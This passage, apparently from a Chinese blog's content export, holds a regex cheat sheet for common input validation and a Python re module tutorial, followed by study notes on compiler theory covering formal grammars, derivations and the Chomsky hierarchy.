正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$\n  负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$\n  浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$\n  二、校验字符的表达式   汉字：^[\\u4e00-\\u9fa5]{0,}$\n  英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$\n  长度为3-20的所有字符：^.{3,20}$\n  由26个英文字母组成的字符串：^[A-Za-z]+$\n  由26个大写英文字母组成的字符串：^[A-Z]+$\n  由26个小写英文字母组成的字符串：^[a-z]+$\n  由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$\n  由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w{3,20}$\n  中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$\n  中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或  ^[\\u4E00-\\u9FA5A-Za-z0-9]{2,20}$\n  可以输入含有^%\u0026',;=?$\"等字符：[^%\u0026',;=?$\\x22]+ 12\n  禁止输入含有~的字符：[^~\\x22]+\n  三、特殊需求表达式   Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$\n  域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?\n  InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%\u0026=]*)?$\n  手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$\n  电话号码(\"XXX-XXXXXXX\"、\"XXXX-XXXXXXXX\"、\"XXX-XXXXXXX\"、\"XXX-XXXXXXXX\"、\"XXXXXXX\"和\"XXXXXXXX)：^(\\(\\d{3,4}-)|\\d{3.4}-)?\\d{7,8}$\n  国内电话号码(0511-4405222、021-87888822)：\\d{3}-\\d{8}|\\d{4}-\\d{7}\n  身份证号(15位、18位数字)：^\\d{15}|\\d{18}$\n  短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$\n  帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$\n  密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w{5,17}$\n  强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)： ^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$\n  日期格式：^\\d{4}-\\d{1,2}-\\d{1,2}\n  一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$\n  一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$\n  钱的输入格式：\n  有四种钱的表示形式我们可以接受:\"10000.00\" 和 \"10,000.00\", 和没有 \"分\" 的 \"10000\" 和 \"10,000\"：^[1-9][0-9]*$\n这表示任意一个不以0开头的数字,但是,这也意味着一个字符\"0\"不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$\n一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$\n这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$\n必须说明的是,小数点后面至少应该有1位数,所以\"10.\"是不通过的,但是 \"10\" 和 \"10.2\" 是通过的：^[0-9]+(.[0-9]{2})?$\n这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$\n这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样： ^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$\n到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须： ^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$\n备注：这就是最终结果了,别忘了\"+\"可以用\"*\"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里\n xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$\n  中文字符的正则表达式：[\\u4e00-\\u9fa5]\n  双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))\n  空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行)*\n  HTML标记的正则表达式：\u003c(\\S*?)[^\u003e]*\u003e.*?\u003c/\\1\u003e|\u003c.*? /\u003e (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)\n  首尾空白字符的正则表达式： ^\\s*|\\s*$或 (^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)\n  腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)\n  中国邮政编码：[1-9]\\d{5}(?!\\d) (中国邮政编码为6位数字)\n  IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用)\n  IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.){3}(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d))\n  Python re模块 人生苦短，不如Python。\n 引用：python基础—re模块—正则表达式\n python从1.5版本起增加re模块为自带的模块，提供了Perl风格的正则表达式模式\n以下是python re库的常用函数\n   函数 描述     compile(pattern[, flags]) 根据包含正则表达式的字符串创建模式对象   search(pattern, string[, flags]) 在字符串中查找模式   match(pattern, string[, flags]) 在字符串开头匹配模式   split(pattern, string[, maxsplit=0]) 根据模式来分割字符串   findall(pattern, string) 返回一个列表，其中包含字符串中所有与模式匹配的子串   sub(pat, repl, string[, count=0]) 将字符串中与模式pat匹配的子串都替换为repl   escape(string) 对字符串中所有的正则表达式特殊字符都进行转义      re.compile()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 语法格式为： re.compile(pattern[, flags]) 实例 \u003e\u003e\u003eimport re \u003e\u003e\u003e pattern = re.compile(r'\\d+') # 用于匹配至少一个数字 \u003e\u003e\u003e m = pattern.match('one12twothree34four') # 查找头部，没有匹配 \u003e\u003e\u003e print(m) None \u003e\u003e\u003e m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配 \u003e\u003e\u003e print(m) None \u003e\u003e\u003e m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配 \u003e\u003e\u003e print(m) # 返回一个 Match 对象 \u003c_sre.SRE_Match object at 0x10a42aac0\u003e \u003e\u003e\u003e m.group(0) # 可省略 0 '12' \u003e\u003e\u003e m.start(0) # 可省略 0 3 \u003e\u003e\u003e m.end(0) # 可省略 0 5 \u003e\u003e\u003e m.span(0) # 可省略 0 (3, 5) 在上面，当匹配成功时返回一个 Match 对象，其中： group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group))。 再看看一个例子： 实例 \u003e\u003e\u003eimport re \u003e\u003e\u003e pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I) # re.I 表示忽略大小写 \u003e\u003e\u003e m = pattern.match('Hello World Wide Web') \u003e\u003e\u003e print(m)# 匹配成功，返回一个 Match 对象 \u003c_sre.SRE_Match object at 0x10bea83e8\u003e \u003e\u003e\u003e m.group(0) # 返回匹配成功的整个子串 'Hello World' \u003e\u003e\u003e m.span(0) # 返回匹配成功的整个子串的索引 (0, 11) \u003e\u003e\u003e m.group(1) # 返回第一个分组匹配成功的子串 'Hello' \u003e\u003e\u003e m.span(1) # 返回第一个分组匹配成功的子串的索引 (0, 5) \u003e\u003e\u003e m.group(2) # 返回第二个分组匹配成功的子串 'World' \u003e\u003e\u003e m.span(2) # 返回第二个分组匹配成功的子串 (6, 11) \u003e\u003e\u003e m.groups() # 等价于 (m.group(1), m.group(2), ...) ('Hello', 'World') \u003e\u003e\u003e m.group(3) # 不存在第三个分组 Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e IndexError: no such group     re.search()\u0026re.match()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118  re.search 扫描整个字符串并返回第一个成功的匹配。 函数语法： re.search(pattern, string, flags=0) 函数参数说明： pattern:匹配的正则表达式 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 匹配成功re.search方法返回一个匹配的对象，否则返回None。 我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 匹配对象方法 group(num=0):匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。 groups():返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。 实例 import re line = \"Cats are smarter than dogs\"; searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I) if searchObj: print (\"searchObj.group() : \", searchObj.group()) print (\"searchObj.group(1) : \", searchObj.group(1)) print (\"searchObj.group(2) : \", searchObj.group(2)) else: print( \"Nothing found!!\") 以上实例执行结果如下： searchObj.group() : Cats are smarter than dogs searchObj.group(1) : Cats searchObj.group(2) : smarter _____________________________________________________________________________ re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法： re.match(pattern, string, flags=0) 函数参数说明：（同re.search一样） 匹配成功re.match方法返回一个匹配的对象，否则返回None。 我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 匹配对象方法：（同re.search一样） 实例 import re print(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配 print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配 以上实例运行输出结果为： (0, 3) None 实例 import re line = \"Cats are smarter than dogs\" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print(\"matchObj.group() : \", matchObj.group()) print(\"matchObj.group(1) : \", matchObj.group(1)) print(\"matchObj.group(2) : \", matchObj.group(2)) else: print(\"No match!!\") 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter ____________________________________________________________________________ re.match与re.search的区别: re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 实例 import re line = \"Cats are smarter than dogs\"; matchObj = re.match( r'dogs', line, re.M|re.I) if matchObj: print(\"match --\u003e matchObj.group() : \", matchObj.group()) else: print (\"No match!!\") matchObj = re.search( r'dogs', line, re.M|re.I) if matchObj: print(\"search --\u003e matchObj.group() : \", matchObj.group()) else: print(\"No match!!\") 以上实例运行结果如下： No match!! search --\u003e matchObj.group() : dogs     re.split()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： re.split(pattern, string[, maxsplit=0, flags=0]) 参数: pattern:匹配的正则表达式 string:要匹配的字符串。 maxsplit:分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 实例 \u003e\u003e\u003eimport re \u003e\u003e\u003e re.split('\\W+', 'runoob, runoob, runoob.') ['runoob', 'runoob', 'runoob', ''] \u003e\u003e\u003e re.split('(\\W+)', ' runoob, runoob, runoob.') ['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', ''] \u003e\u003e\u003e re.split('\\W+', ' runoob, runoob, runoob.', 1) ['', 'runoob, runoob, runoob.'] \u003e\u003e\u003e re.split('a*', 'hello world') # 对于一个找不到匹配的字符串而言，split 不会对其作出分割 ['hello world']     re.sub()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。 语法: re.sub(pattern, repl, string, count=0, flags=0) 参数： pattern : 正则中的模式字符串。 repl : 替换的字符串，也可为一个函数。 string : 要被查找替换的原始字符串。 count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 实例: import re phone = \"2004-959-559 # 这是一个国外电话号码\" num = re.sub(r'#.*$', \"\", phone) # 删除字符串中的 Python注释 print (\"电话号码是: \", num) num = re.sub(r'\\D', \"\", phone) # 删除非数字(-)的字符串 print (\"电话号码是 : \", num) 以上实例执行结果如下： 电话号码是: 2004-959-559 电话号码是 : 2004959559 以下实例中将字符串中的匹配的数字乘以 2： import re def double(matched): # 将匹配的数字乘以 2 value = int(matched.group('value')) return str(value * 2) s = 'A23G4HFD567' print(re.sub('(?P\u003cvalue\u003e\\d+)', double, s)) 执行输出结果为： A46G8HFD1134     findall()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次,findall 匹配所有。 语法格式为： findall(string[, pos[, endpos]]) 参数： string: 待匹配的字符串。 pos: 可选参数，指定字符串的起始位置，默认为 0。 endpos: 可选参数，指定字符串的结束位置，默认为字符串的长度。 查找字符串中的所有数字： 实例 import re pattern = re.compile(r'\\d+') # 查找数字 result1 = pattern.findall('runoob 123 google 456') result2 = pattern.findall('run88oob123google456', 0, 10) #取字符串之中0-10之间的数字出来 print(result1，result2) 输出结果： ['123', '456']，['88', '12']     re.finditer()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0) 参数: pattern:匹配的正则表达式 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 实例 import re it = re.finditer(r\"\\d+\",\"12a32bc43jf3\") for match in it: print (match.group() ) 输出结果： 12 32 43 3     re.escape()   re.escape()的主要作用就是将一个字符串变成可以匹配的正则表达式\n1 2 3 4 5 6  re.escape是一个工具函数，用于对字符串中所有可能被视为正则表达式运算符的字符进行转义。使用这个函数的情况有：字符串很长，其中包含大量特殊字符，而你不想输入大量的反斜杠；你从用户那里获取了一个字符串（例如，通过函数input），想将其用于正则表达式中。下面的示例说明了这个函数的工作原理： \u003e\u003e\u003e re.escape('www.python.org') 'www\\\\.python\\\\.org' \u003e\u003e\u003e re.escape('But where is the ambiguity?') 'But\\\\where\\\\is\\\\the\\\\ambiuity\\\\?'   ","description":"","tags":["regex","python"],"title":"Regular Expression","uri":"/posts/regular-expression/"},{"categories":["compiler"],"content":"一、引论 编译原理是良好的数学基础和好的工程结构功能的结合。\nCompiler：编译，述而不作，忠于编写的东西\n编译器从逻辑上可以分成若干阶段，每个阶段把源程序从一种表示变换成另一种表示\n1.1什么叫编译程序 翻译器（翻译程序）：Translater\n能将一种语言程序（源语言程序）转换成另一种等价的语言程序（目标语言程序）\n编译器（编译程序）：Compiler\n能将一种计算机高级语言程序（源语言程序）转换成另一种等价的计算机低级语言程序（目标语言程序）\n解释器（解释程序）：Interpreter\n也是一种翻译程序，以一种语言写的源程序作为输入，但不产生目标代码，而是边解释边执行\n解释器和编译器的区别：\n①编译分成两步完成：先翻译，在运行\n②解释只用一步就完成：边解释边执行\n可变目标编译程序（Retargetable Compiler）\n交叉编译程序（Cross Compiler）\n1.2编译程序的组成 词法分析器：读入组成源程序的字符流，并将它们组织成为有意义的词素的序列\n语法分析器：使用由词法分析器生成的各个词法单元的第一个分量来创建树形的中间表示，该中间表示给出了词法分析产生的词法单元流的语法结构。一个常用的表示方法便是语法树，树中的每个内部节点表示一个运算\n语义分析器：使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致。同时也收集类型信息，并把这些信息存放在语法树或符号表中，以便在随后的中键代码生成过程中使用。\n中间代码生成器：在把一个源程序翻译成目标代码的过程中，一个编译器可能构造出一个或多个中间表示。这些中间表示可以有多种形式。比如语法树是一种中间表示形式，通常在语法分析和语义分析中使用。\n代码优化器：机器无关的代码优化步骤试图改进中间代码，以便生成更好的目标代码\n代码生成器：代码生成器以源程序的中间表示形式作为输入，并把它映射到目标语言。\n符号表管理器：记录源程序中使用的变量的名字，并收集和每个名字的各种属性有关的信息。\n Tips:\n如何学习构造编译程序\n（1）源语言，对被编译的源程序深刻理解其结构和含义\n（2）目标语言，假定目标语言是机器语言，就必须搞清楚硬件的系统结构和操作系统的功能\n（3）编译方法，把一种语言翻译成另一种语言的方法很多，重点\n 二、高级语言及其语法描述 2.1程序语言的语法和语义 2.1.1语法 任何语言均可作一个集合。这个集合中的每个元素都是在一定符号集（字母表）上的一个符号串。\n对于自然语言来说，他们是定义在某个字母表上的句子的集合\n对于程序语言来说，他们也是定义在某个字母表上的句子的集合。这里的句子，就是一个源程序。\n词法规则：单词符号是语言中具有独立意义的最基本单位。语言的单词符号是由词法规则所确定的，即词法规则规定了单词符号的形成规则。\n语法规则：上下文无关文法或BNF（Backus-Naur范式）\n2.1.2语义 语义，定义程序的意义\n没有公认的形式系统描述语义\n2.2程序语言的一般特征 高级语言的分类  强制性语言（Imperative Language）|过程式语言：Fortran，C，Pascal 应用式语言（Applicative Language）|函数式语言：LISP 基于规则的语言（Ruled-based Language）：Prolog 面向对象语言（Object-oriented Language）：JAVA，c++  2.3程序语言的语法描述 一、字母表和符号串 字母表：符号的非空有限集合 例：∑ ={a，b，c}\n符号：字母表中的元素 例： a，b，c\n符号串：符号的有穷序列 例：a, aa, ac, abc，..\n空符号串：无任何符号的符号串( ε )\n符号串集合：由符号串构成的集合。\n 符号串的形式定义\n有字母表∑，定义：\n（1）ε是∑上的符号串；\n（2）若x是∑上的符号串，且a∈ ∑，则ax或xa是 ∑ 上的符号串；\n（3）y是∑上的符号串，iff（当且仅当）y可由（1）和（2）产生。\n 二、符号串和符号串集合的运算 符号串相等：若x、y是集合上的两个符号串，则x＝y，iff（当且仅当）组成x的每一个符号和组成y的每一个符号依次相等。\n符号串的长度：若x为符号串，其长度|x|等于组成该符 号串的符号个数。（例：x＝STV， |x|=3）\n符号串的连接：若x、y是定义在Σ是上的符号串，且x＝XY，y＝YX，则x和y的连接 xy ＝ XYYX 也是Σ上的符号串。（注意：一般xy ≠ yx，但是εx = xε）\n符号串集合的乘积运算：令A、B为符号串集合，定义AB＝{ xy | x∈A, y∈B}\n符号串集合的幂运算：有符号串集合A，定义A0 ={ε}, A1=A, A2=AA, A3=AAA,…… ……, An＝An-1A=AAn-1  ，n\u003e0\n符号串集合的闭包运算：设A是符号串集合，定义 A＋＝ A1 ∪ A2 ∪ A3 ∪……∪ An ∪…… 称为集合A的正则闭包。A*＝ A0 ∪A＋ 称为集合A的闭包。（A0 = { ε } ）\n为什么对符号、符号串、符号串集合以及它们的运算感兴趣？\n若A为某语言的基本字符集\n​ A＝{a,b,……z,0,1,……,9, +,－,×,_/, ( , ), =……}\nB为单词集\n​ B ={begin, end, if, then,else,for,……,\u003c标识符\u003e,\u003c常量\u003e,……}\n则B ⊂ A* 。\n语言的句子是定义在B上的符号串。\n若令C为句子集合，则C ⊂ B* , 程序 ⊂ C\n三、文法的直观理解 1.什么是文法：文法是对语言结构的定义与描述。即从形式上用于描述和规定语言结构的称为“文法”（或称为“语法”）。\n2.语法规则：我们通过建立一组规则（产生式），来描述句子的语法结构。规定用“::=”表示“由……组成“。\n 例如：\n\u003c句子\u003e::=\u003c主语\u003e\u003c谓语\u003e\n\u003c主语\u003e::=\u003c代词\u003e|\u003c名词\u003e\n\u003c代词\u003e ::=你|我|他\n\u003c名词\u003e::= 王民|大学生|工人|英语\n\u003c谓语\u003e::=\u003c动词\u003e\u003c直接宾语\u003e\n\u003c动词\u003e::=是|学习\n\u003c直接宾语\u003e::=\u003c代词\u003e|\u003c名词\u003e\n 3.由产生式推导句子：3.有了一组产生式之后，可以按照一定的方式用它们去推导或产生句子。\n​ 推导方法：从一个要识别的符号开始推导，即用相应产生式的右部来替代产生式的左部，每次仅用一条产生式去进行推导。\n\u003c句子\u003e =\u003e \u003c主语\u003e\u003c谓语\u003e\n\u003c主语\u003e\u003c谓语\u003e =\u003e \u003c代词\u003e\u003c谓语\u003e\n…… ……\n这种推导一直进行下去，直到所有带\u003c \u003e的符号都由终结符号替代为止。\n 说明：有若干语法成分同时存在时，我们总是从最左的语法成分进行推导，这称之为最左推导，类似的有最右推导（一般推导）。\n 文法实在形式上对句子结构的定义与描述，而未涉及语义问题\n4.语法树\n一般用语法树来描述一个句子的语法结构。\n四、文法和语言的形式定义 1.文法的定义 定义1: 文法 G =（VN，VT，P，Z）\n​\tVN ：\t非终结符号集 ​\tVT ：\t终结符号集 ​\tP：\t产生式或规则的集合 ​\tZ：\t开始符号（识别符号） Z∈VN\n  产生式：产生式是一个有序对(U, x), 通常写为:  ​ U ::= x 或U ➡ x； |U| = 1 |x| \u003e= 0\n  非终结符号：出现在产生式的左部,且能推出符号或符号串的那些符号。其全体构成非终结符号集，记为VN\n  终结符号：不出现在产生式的左部,且不能推出符号或符号串的那些符号。其全体构成终结符号集，记为VT\n   无符号整数的文法: G[\u003c无符号整数\u003e]=（VN，VT，P，Z） VN＝{\u003c无符号整数\u003e, \u003c数字串\u003e, \u003c数字\u003e} VT = {0,1,2,3,4,5,6,7,8,9} P = {\u003c无符号整数\u003e → \u003c数字串\u003e ; \u003c数字串\u003e → \u003c数字串\u003e \u003c数字\u003e ; \u003c数字串\u003e → \u003c数字\u003e ; \u003c数字\u003e →0; \u003c数字\u003e →2; \u003c数字\u003e →3;\t\u003c数字\u003e →4;\t\u003c数字\u003e →5; \u003c数字\u003e →6;\t\u003c数字\u003e →7;\t\u003c数字\u003e →8; \u003c数字\u003e →9; } Z = \u003c无符号整数\u003e; 注：产生式左边符合构成集合VN，且Z ∈ VN\n​\t有些产生式有相同的左部，可以合在一起\n​\t给定一个文法，实际上只需给出产生式的集合，并指定识别符号（开始符号）\n2.推导与归约 **定义2：**直接推导：\n有文法G：v = xUy，w = xuy，其中x、y∈V*，U∈VN，u∈V*，\n若U ::= u∈P，则v ⇒ w，\n若 x = y = ε ， 有 U ::= u， 则U ⇒ u\nx和y是符号串，若使用一次产生式可以从x变换出y，则称x直接推导出y(或者说y是x的直接推导），记为x⇒y。\n定义3： +推导：x和y是符号串，若使用若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x =+=⇒y。\n即，若有直接推导序列：x=U0==\u003eU1==\u003eU2==\u003e……==\u003eUn=y,则 x=+=\u003ey 。\n定义4：*推导：x和y是符号串，若使用0次或若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x=*=\u003ey。\n如：N=*=\u003eN， N=*=\u003e109\n**定义5：**最右推导\u0026最左推导\n  最右推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最右非终结符进行替换，称为最右推导。\n  最左推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最左非终结符进行替换，称为最左推导。\n  ！！！规范推导＝最右推导\n**定义6：**推导的逆过程为归约\nx==\u003ey，可称为x直接推导出y，也可称为y直接归约出x\n3.语言的形式定义 **定义7：**文法G[Z]\n​\t（1）句型：x是句型 ⇔ Z =*=\u003ex,且 x∈V*；\n​\t（2）句子：x是句子 ⇔ Z =+=\u003e x, 且 x∈VT*；\n​\t（3）语言：L（G[Z]）={x| Z=+=\u003ex， x∈VT* }；（文法G[z]产生的所有句子的集合）\n定义8：G和G'是两个不同的文法，若L(G) = L(G')，则G和G'为等价文法\n编译感兴趣的问题如下\n给定终极符x，文法G，求x ∈ L(G)？\n4.文法分类\n 形式语言：用文法和自动机所描述的没有语义的语言  语言定义： L(G[Z]) = { x | Z=+=\u003ex，x∈VT* }\n文法定义：乔姆斯基将所有文法定义为一个四元组：G = （VN，VT，P，Z）\n VN ：\t非终结符号集 VT ：\t终结符号集 P：\t产生式或规则的集合 Z：\t开始符号（识别符号） Z∈VN\n 文法和语言的分类：0型、1型、2型、3型\n定义9： 0型文法\n P： u → v ，其中 u ∈ V+，v ∈ V*\n0型文法称为短语结构文法。产生式的左部和右部都可以是符号串，一个短语可以产生另一个短语。\n0型语言：L0，这种语言可以用**图灵机（Turing）**接受\n **定义10：**1型文法\n P： xUy → xuy ，其中 U ∈VN，x、y、u ∈ V*\n1型文法称为上下文有关或上下文敏感。即只有在x、y这样的上下文中才能将U改写为u\n1型语言：L1，这种语言可以有一种线性界限自动机接受\n **定义11：**2型文法\n P： U → u ，其中 U ∈ VN ，u ∈ V*\n2型文法称为上下文无关文法。即把U改写为u时，不必考虑上下文。\n注意：2型文法与BNF表示相等价。\n2型语言：L2，这种语言可以由下推自动机接受\n **定义12：**3型文法\n （左线型） P： U → T | U → wT ，其中 U、w ∈ VN ，T ∈ VT\n（右线性）P： U → T | U → Tw ，其中 U、w ∈ VN ，T ∈ VT\n3型文法称为正则文法。它是对2型文法进行进一步的限制\n3型语言：L3，又称正则语言、正则集合，这种语言可以由有穷自动机接受\n 由上易知， L0 ⊃ L1 ⊃ L2 ⊃ L3\n0型文法可以产生L0、L1、L2、L3，但2型文法只能产生L2，不能产生L1\n5.语法树与二义性文法 1.推导与语法树\n语法树：句子结构的图示表示法，通常表示称一棵倒立的树，即\n 结点：\t符号\n根节点：\t识别符号\n中间节点：非终结符\n叶节点：\t终结符或非终结符\n边：表示节点间的派生关系\n 句型的推导及语法树的生成（自顶向下）\n给定G[Z]，句型w：可建立推导序列，Z =*=\u003e w；可建立语法树，以Z为树根节点，每步推导生成语法树的一枝，最终可生成句型的语法树。\n语法树的生成规律不同，但最终生成的语法树形状完全相同\n一般推导\ngraph TB A[\u003c无符号整数\u003e] --\u003e B[\u003c数字串\u003e] B --\u003e C[\u003c数字串\u003e] B --\u003e D[\u003c数字\u003e] C --\u003e E[\u003c数字\u003e] E --\u003e F[1] D --\u003e G[0] 树与推导：句型推导过程 ⇔ 句型语法树的生长过程\n①由推导构造语法树\n从识别符号开始，自左向右建立推导序列 ⇒ 由根节点开始，自上而下建立语法树\n②由语法树构造推导\n自叶而根修剪子树的末端节点，直至把整棵树剪掉（留根），每剪一次对应一次归约 ⇒ 从句型开始，自右向左地逐步进行归约，建立推导序列\n2.文法的二义性\n定义：若对于一个文法的某一句子存在两棵不同的语法树，则该文法是二义性文法，否则是无二义性文法\n换而言之，无二义性文法的句子只有一棵语法树，尽管推导过程可以不同\n比如二义性文法: G[E]:\tE := E+E | E*E | (E) | i Vn = {E} VT = {+,*,(,),i} 针对 i+i*i 有两种不同的语法树 定义：若一个文法的某句子存在两个不同的规范推导（最右推导），则该文法是二义性的，否则是无二义性的\n 若文法是二义性的，则在编译时就会产生不确定性，遗憾的是在理论上已经证明：文法的二义性是不可判定的，即不可能构造出一个算法，通过有限步骤来判定任一文法是否有二义性\n现在的解决办法是：提出一些限制条件，称为无二义性的充分条件，当文法满足这些条件时，就可以判定文法是无二义性的。\n由于无二义性文法比较简单，我们也可以采用另一种解决办法：即不改变二义性文法，而是确定一种编译算法，使该算法满足无二义性充分条件。\n 句柄：句型的句柄是和某产生式右部匹配的子串。句柄是直接短语，即某产生式的右部，具有最左性\n若句柄不存在重复，就说明文法无二义性\n如 S → ABC ，ABC为该句子的句柄\n三、词法分析  词法分析 （Lexical Analysis）  实现词法分析器的程序称为词法分析程序（扫描器）\n词法分析程序的主要任务：对构成源程序的字符串从左到右的扫描，逐个字符地读入源程序字符并按照构词规则切分成一个一个具有独立意义的单词。并确定其属性（如保留字、标识符、运算符、界限符和常量等）。再把它们转换成长度统一的标准形式——属性字（TOKEN）。\n词法分析是编译过程中的第一个阶段，在语法分析前进行。也可以和语法分析结合在一起作为一遍，由语法分析程序调用词法分析程序来获得当前单词供语法分析使用。\ngraph LR A[源程序] --\u003e B[词法分析程序] B -- Token --\u003e C[语法分析程序] C -- get token --\u003e B  为什么将词法分析工作从语法分析工作中独立出来？\n  简化设计\n  改进编译效率\n  增加编译系统的可移植性\n   3.1 词法分析器的要求  